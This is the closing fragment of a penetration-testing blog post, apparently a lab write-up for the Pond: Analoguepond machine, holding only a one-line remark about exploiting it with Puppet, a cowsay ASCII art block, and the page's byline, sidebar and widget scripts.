+<p>This was another excellent machine by Knightmare! Using puppet for exploitation was a new and exciting way to pwn the box.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>_______________________________________
+</span><span class='line'>/ Communicate! It can't make things any \
+</span><span class='line'>\ worse.                                /
+</span><span class='line'>---------------------------------------
+</span><span class='line'>       \   ^__^
+</span><span class='line'>        \  (oo)\_______
+</span><span class='line'>           (__)\       )\/\
+</span><span class='line'>               ||----w |
+</span><span class='line'>               ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2019-05-30T21:45:50+03:00" pubdate data-updated="true">May 30<span>th</span>, 2019</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2019/05/30/pond-analoguepond/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2019/05/30/pond-analoguepond/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2019/05/19/derpnstink/" title="Previous Post: Derpnstink">&laquo; Derpnstink</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2019/05/30/pond-analoguepond/">Pond. Analoguepond</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/05/19/derpnstink/">Derpnstink</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/04/15/donkey-docker/">Donkey Docker</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/04/07/hackfest-2016-orcus/">Hackfest 2016 Orcus</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2019/04/02/goldeneye-007/">GoldenEye 007</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2019 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2019/05/30/pond-analoguepond/';
+        var disqus_url = 'http://chousensha.github.io/blog/2019/05/30/pond-analoguepond/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
